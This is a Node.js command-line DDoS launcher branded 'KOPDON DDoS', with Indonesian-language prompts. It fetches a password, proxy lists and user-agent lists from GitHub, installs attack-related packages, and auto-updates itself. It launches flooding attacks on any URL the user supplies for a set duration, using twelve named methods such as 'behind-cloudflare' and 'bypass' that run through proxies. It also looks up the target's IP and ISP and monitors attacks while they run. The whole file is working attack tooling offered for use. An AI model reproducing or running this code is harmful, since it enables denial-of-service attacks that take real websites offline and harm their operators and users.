#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '8.1.6'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})


// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
  console.clear();
  const date = new Date();
  const year = date.getFullYear();
  const month = (date.getMonth() + 1).toString().padStart(2, '0');
  const day = date.getDate().toString().padStart(2, '0');
  
  const activeAttacks = processList.length;
console.clear()
console.log(`KOPDON DDOS TEAM`)};

async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/heydeden/DDoS/refs/heads/main/proxy.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/heydeden/DDoS/refs/heads/main/user-agent.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios chalk cluster colors crypto dgram gradient-string header-generator hpack http2 libphonenumber-js mineflayer net pino proxy-agent socks ssh2 tls user-agents`)
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/Xlamper/PermenMdXlamper-Version-8.1.6-/refs/heads/main/version.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
    
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/heydeden/DDoS/refs/heads/main/password.txt');
    const password = await secretBangetJir.text();
    await console.log(`masukan password`)
    permen.question('[\x1b[1m\x1b[31mKEY\x1b[0m]: \n', async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`Successfuly Logged`)
        await scrapeProxy()
        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
        await scrapeUserAgent()
        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
        await sleep(700)
        console.clear()
        console.log(`KOPDON HERBAL DDoS  ${version}`)
        await sleep(1000)
		    await banner()
        console.log(`Ketik "menu" untuk menampilkan command nya`)
        sigma()
      } else {
        console.log(`password salah`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      console.log(`Waiting Auto Update...`)
      await exec(`npm uninstall -g prmnmd-tuls`)
      console.log(`Installing update`)
      await exec(`npm i -g prmnmd-tuls`)
      console.log(`Restart Tools Please`)
      process.exit()
    }
  } catch (error) {
    console.log(`Are You Online?`)
  }
}
// [========================================] //
async function pushMonitor(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function monitorAttack() {
  console.log("\nMonitor Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <url> <duration> <methods>
attack https://google.com 120 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
KOPDON HERBAL DDoS
                                    
attack detail                       
---------------------------------------------------------------------
target   : ${target}          
durasi   : ${duration} 
metode  : ${methods}              
as       : ${result.as}          
ip       : ${result.query}          
isp      : ${result.isp}
jumlah attack : ${processList.length}
---------------------------------------------------------------------                               

attack di mulaimulai...

`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
 if (methods === 'attackpanel') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 60 proxy.txt`)
	sigma()
  } else if (methods === 'attackpanel2') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 60 proxy.txt`)
	sigma()
  } else if (methods === 'attacksch') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 60 proxy.txt`)
	sigma()
  } else if (methods === 'behind-cloudflare') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 60 proxy.txt`)
	sigma()
  } else if (methods === 'bypass') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 60 proxy.txt`)
	sigma()
  } else if (methods === 'ddosrestart') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 60 proxy.txt`)
	sigma()
  } else if (methods === 'guardresponder') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 60 proxy.txt`)
	sigma()
  } else if (methods === 'mixmax') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 60 proxy.txt`)
	sigma()
  } else if (methods === 'netsecure') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 60 proxy.txt`)
	sigma()
  } else if (methods === 'nightddos') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 60 proxy.txt`)
	sigma()
  } else if (methods === 'overload') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 60 proxy.txt`)
	sigma()
  } else if (methods === 'sky') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 60 proxy.txt`)
	sigma()
  } else if (methods === 'strike') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 60 proxy.txt`)
	sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created And Coded Full By KOPDON 

thanks to:
deden
iksan
fahmi
doni
yana
`
permen.question('╭─[\x1b[1m\x1b[32mKOPDON DDoS\x1b[0m]: \n╰┈┈➤',(input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'menu') {
    console.log(`
| methods      | show list of available methods
| attack       | launch ddos attack
| monitor      | show monitor attack
| credits      | show creator of these tools
| clear        | clear terminal
`);
    sigma();
  } else if (command === 'menu') {
    console.log(`
==============================================
                TOOLS COMMANDS
==============================================

| COMMAND      | DESCRIPTION
-----------------------------------------------------------------------------------------------------------
| methods      | Show list of available methods.
| DDos         | Launch an attack: <url> <duration> <methods>.
| monitor      | Display ongoing attack monitor.
| credits      | Show creator of these tools.
| clear

`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
+---------------------+--------------------------------------------+-------+
| Methods             | Description              
+---------------------+--------------------------------------------+-------+
1. strike
2. behind-cloudflare
3. overload
4. attackpanel
5. attackpanel2
6. netsecure
7. sky
8. guardresponder
9. mixmax
10. bypass
11. ddosrestart
12. attacksch
+---------------------+--------------------------------------------+-------+


`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'monitor') {
    monitorAttack()
    sigma()
  } else if (command === 'clear') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()
